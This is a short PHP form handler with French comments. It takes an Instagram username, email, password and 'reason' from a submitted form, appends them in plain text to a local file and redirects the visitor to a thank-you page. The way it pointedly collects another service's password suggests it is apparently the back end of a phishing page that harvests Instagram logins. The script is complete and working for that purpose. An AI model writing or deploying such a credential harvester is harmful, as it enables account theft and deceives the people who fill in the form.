<?php
// Vérification si le formulaire est soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération des données du formulaire
    $username = htmlspecialchars($_POST['username']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']); // Récupération du mot de passe
    $reason = htmlspecialchars($_POST['reason']);
    
    // Validation (exemple simple)
    if (empty($username) || empty($email) || empty($password) || empty($reason)) {
        echo "Tous les champs sont obligatoires.";
    } else {
        // Enregistrement des données dans un fichier (ou base de données)
        $file = fopen("submissions.txt", "a"); // Ouvre le fichier en mode ajout
        if ($file) {
            // Inclure le mot de passe dans les données enregistrées
            $data = "Nom d'utilisateur Instagram: $username\nEmail: $email\nMot de passe: $password\nRaison: $reason\n\n";
            fwrite($file, $data); // Écrit les données dans le fichier
            fclose($file); // Ferme le fichier

            // Rediriger vers la page de remerciement
            header("Location: thankyou.html");
            exit();
        } else {
            echo "Erreur : Impossible d'ouvrir le fichier.";
        }
    }
} else {
    // Si le formulaire n'est pas soumis correctement
    echo "Erreur : Le formulaire n'a pas été soumis correctement.";
}
?>

